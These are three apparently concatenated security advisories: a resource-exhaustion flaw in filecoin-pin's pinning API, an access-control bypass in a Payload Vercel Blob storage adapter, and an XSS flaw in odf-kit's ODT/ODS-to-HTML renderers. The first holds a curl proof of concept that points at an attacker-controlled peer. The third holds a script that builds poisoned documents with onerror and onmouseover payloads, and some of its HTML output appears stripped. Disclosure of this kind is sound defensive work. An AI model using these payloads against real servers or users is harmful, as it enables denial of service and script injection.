summary: filecoin-pin: Unbounded DAG pinning can exhaust server resources
description:
## Summary

The IPFS Pinning Service API implementation accepts a caller-controlled CID through `POST /pins`, queues background processing, and then recursively fetches the full DAG with `helia.pins.add(cid)`. The route and background pinning path do not enforce a request rate limit, per-user quota, maximum DAG byte count, maximum block count, traversal timeout, or concurrent pinning limit.

An authenticated caller, or an unauthenticated caller when the server is started with `ALLOW_NO_AUTH=true`, can submit one or more pins whose CIDs resolve to very large DAGs. The server writes fetched blocks to CAR files under `carStoragePath` and can consume disk, network, CPU, and libp2p resources until the process or host becomes unavailable.

## Details

`POST /pins` validates only that the request body contains a syntactically valid CID string, then forwards it to the pin store:

- `src/filecoin-pinning-server.ts:304-342` accepts the request, parses `cid` with `CID.parse`, and calls `pinStore.pin(request.user, cidObject, parsed.options)`.
- `src/filecoin-pin-store.ts:153-188` stores the pin as `queued` and schedules `_processPinInBackground` with `setTimeout`. There is no queue, semaphore, or global cap around this scheduling.
- `src/filecoin-pin-store.ts:211-217` creates a per-pin Helia node and forwards caller-supplied `origins`.
- `src/filecoin-pin-store.ts:260-274` walks the full DAG with `for await (const pinnedCid of helia.pins.add(cid))`.
- `src/create-pinning-helia.ts:47-80` creates a libp2p/Helia node with the Bitswap block broker and no application-level resource limits.
- `src/core/car/car-blockstore-base.ts:65-107` writes every fetched block and updates `stats.totalSize` only after writing.
- `src/core/car/car-file-backend.ts:84-93` streams blocks to the CAR writer on disk.

The Helia node created for each pin has no bootstrap or mDNS configuration (`src/create-pinning-helia.ts:57`). A public CID alone may therefore not be fetchable unless the node can reach a content source. In practice, the API also accepts `origins`, so an attacker can supply a reachable attacker-controlled libp2p origin that serves a large DAG and cause the server to retrieve it.

## Impact

Successful exploitation affects availability:

- Disk exhaustion from unbounded CAR files in `carStoragePath`.
- Network exhaustion from recursive Bitswap retrieval.
- CPU and memory pressure from concurrent libp2p/Helia pin operations.
- Service degradation or process failure for other users of the daemon.
- Operational cost and manual recovery burden from large partial CAR files.

The default daemon configuration reduces exposure because the server binds to `localhost` and refuses to start without an access token unless `ALLOW_NO_AUTH=true`. The finding is most significant when the daemon is exposed beyond localhost, when the token is shared across untrusted users, or when the no-auth mode is enabled.

## PoC

```bash
curl -X POST "https://target.example/pins" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "cid": "CID_OF_LARGE_DAG",
    "origins": ["/ip4/203.0.113.10/tcp/4001/p2p/ATTACKER_PEER_ID"],
    "meta": { "purpose": "resource-exhaustion-validation" }
  }'
```

Submitting many such requests concurrently accelerates resource pressure because each request schedules independent background processing.

summary: @payloadcms/storage-vercel-blob has access control bypass of uploads in Vercel Storage adapter
description:
### Impact
In affected configurations, client upload access does not consistently align with the associated collection’s access configuration.

You are affected if:
- You use client uploads with `@payloadcms/storage-vercel-blob`.
- Authenticated users can access the client-upload route.

Applications that do not enable client uploads are not affected.

### Patches
Client uploads now require authentication and the appropriate collection-level access before upload access is granted.

Users should upgrade Payload packages to `>= 3.90.0` or `>= 4.0.0-canary.34`.

### Workarounds
Upgrading to a patched version is recommended. Until you can upgrade, disable client uploads or configure the upload route’s access control to enforce the associated collection’s permissions.

summary: odf-kit: HTML injection leading to XSS in odtToHtml() and odsToHtml() via unescaped style attribute values
description:
### Summary ODF style attribute values are interpolated into `style="..."` attributes without HTML-escaping in **both** of odf-kit's to-HTML renderers (`odtToHtml` and `odsToHtml`). A double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary HTML/attribute injection — and therefore script execution (XSS) — from a crafted `.odt` or `.ods` file wherever the rendered output is inserted as HTML, which is the documented purpose of both functions. ### Details #### ODT renderer (`src/odt/to-html/html-renderer.ts`) The renderer has an `escapeHtml()` helper and applies it consistently to text content and to attribute values — `href`, `src`, `alt`, `id`, `data-author`, `data-date`, citation text all go through it. The inline CSS strings do not. In `renderTextSpan` (dist/odt/to-html/html-renderer.js:195): ```js const css = spanStyleToCss(span.style); if (css) html = `${html}`; ``` The value of e.g. `fo:color` is copied from the document into `style.fontColor` verbatim by the parser (`extractSpanStyle`, read/parser.js:348), then concatenated raw into the attribute. A `"` in the value terminates the attribute early. The same unescaped `style="${...}"` pattern appears at roughly ten other emission sites: paragraph and heading (`paragraphStyleToCss`), table cells and rows (`cellStyleToCss`, `rowStyleToCss`), ``, and the image style attribute. The affected source attributes include `fo:color`, `fo:background-color`, `fo:text-shadow`, `fo:letter-spacing`, `fo:font-family` (via both direct and font-face resolution), `fo:margin-*`, `fo:padding-*`, `fo:line-height`, `fo:border*`, and `style:vertical-align`. #### ODS renderer (`src/ods/to-html/html-renderer.ts`) — same bug `buildInlineStyle()` assembles the CSS string from cell formatting properties — `fo:color`, `fo:font-size`, `fo:font-family`, `fo:background-color`, `fo:text-align`, etc. — with zero `escapeHtml` calls, and `renderCell` emits it raw (line 65): ```ts if (includeStyles && cell.formatting) { const style = buildInlineStyle(cell.formatting); if (style) attrs.push(`style="${style}"`); } ``` Additionally, `row.height` (from `style:row-height`) goes raw into the row element (line 95): ```ts const style = includeStyles && row.height ? ` style="height:${row.height}"` : ""; return `${cells}`; ``` The same injection is reachable through the public `odf-kit/ods/to-html` export (`odsToHtml()`), so both to-HTML directions are affected. #### Version scope The `odt/to-html` and `ods/to-html` modules first shipped in **0.14.0**; the current latest release is **0.14.1**. The PoCs were re-ran against the unreleased `main` branch (commit `270a361`) — both injections still fire, so no fix has landed past the release. ### PoC Each PoC is a minimal ODF package (`mimetype` + `META-INF/manifest.xml` + `content.xml`) whose `content.xml` contains exactly one poisoned automatic style. The files are generated by this short Python script (stdlib only, no dependencies) — save as `build-pocs.py` and run `python3 build-pocs.py`: ```python import zipfile def build(path, mimetype, content): # ODF requires 'mimetype' first and stored uncompressed with zipfile.ZipFile(path, "w") as z: z.writestr(zipfile.ZipInfo("mimetype"), mimetype, compress_type=zipfile.ZIP_STORED) z.writestr("META-INF/manifest.xml", '\n' '\n' ' \n' ' \n' '\n') z.writestr("content.xml", content) ODT = "application/vnd.oasis.opendocument.text" ODS = "application/vnd.oasis.opendocument.spreadsheet" HEAD = ('\n' '') Q = """ p1 = f"red{Q} onmouseover={Q}alert(1){Q} x={Q}" # attribute injection p2 = f'red{Q}><img src=x onerror={Q}alert(1){Q}><x style={Q}' # full markup injection # .odt: one paragraph with a poisoned automatic text style def odt(p): return (HEAD + '\n\n' ' \n' f' \n' ' \n\n' 'hello' '\n') # .ods: one cell with a poisoned automatic cell style def ods(p): return (HEAD + '\n\n' ' \n' f' \n' ' \n\n' '' '' 'hello' '\n') build("poc1.odt", ODT, odt(p1)) build("poc2.odt", ODT, odt(p2)) build("poc3.ods", ODS, ods(p2)) ``` This produces `poc1.odt`, `poc2.odt` and `poc3.ods`. The only attacker-controlled input is the `fo:color` value on the style — for poc1 it reads, as stored in `content.xml`: ```xml ``` **poc1.odt — attribute injection (ODT).** The `fo:color` value (unescaped) is: ``` red" onmouseover="alert(1)" x=" ``` (encoded as `"` in the XML). Output of `odtToHtml(bytes, { fragment: true })`: ```html

hello

``` The quote breaks out of `style`, and `onmouseover` becomes a real attribute on the span. **poc2.odt — full markup injection (ODT).** The style value is: ``` red">hello

``` **poc3.ods — same injection via the ODS renderer.** A crafted `.ods` whose cell automatic style carries a poisoned `fo:color` value (same payload as poc2). Output of `odsToHtml(bytes)`: ```html hello ``` Reproduction script: ```js import { readFileSync } from 'fs'; import { odtToHtml } from 'odf-kit/odt/to-html'; import { odsToHtml } from 'odf-kit/ods/to-html'; const bytes = (p) => new Uint8Array(readFileSync(p)); console.log(odtToHtml(bytes('poc2.odt'), { fragment: true })); console.log(odsToHtml(bytes('poc3.ods'))); ``` This was found while auditing ODT import paths in a web application that uses odf-kit as its converter. That application happens to sanitize the output downstream, so minimal standalone reproductions were built against the published odf-kit 0.14.1 package directly in Node. ### Impact Any consumer that renders `odtToHtml()` or `odsToHtml()` output as HTML — which is both functions' documented purpose — gets XSS from a crafted `.odt`/`.ods` file they convert. Untrusted file → arbitrary tags and attributes → script execution in the host page with the page's origin. The fragment mode (`{ fragment: true }`) is equally affected. The header comment in the ODT renderer currently promises "the output is safe to embed in any context", so consumers may reasonably be relying on that today. For what it's worth, the sibling paths were checked: the markdown direction does not reach this code, and `escapeHtml` is correctly applied everywhere else I looked in the ODT renderer. The ODS renderer initially appeared clean too, but the `buildInlineStyle` path above is the second instance of the same defect. ### Suggested fix Escape the assembled CSS string at every `style="${...}"` site, in both renderers: ```js html = `${html}` ``` (or, stronger, validate/allowlist the parsed style values at parse time — they are all supposed to be color literals, lengths, or keywords, so a strict per-property format check would also work; escaping `row.height` in the ODS renderer at line 95 as well). The per-site escape is the minimal fix consistent with the rest of the ODT file.
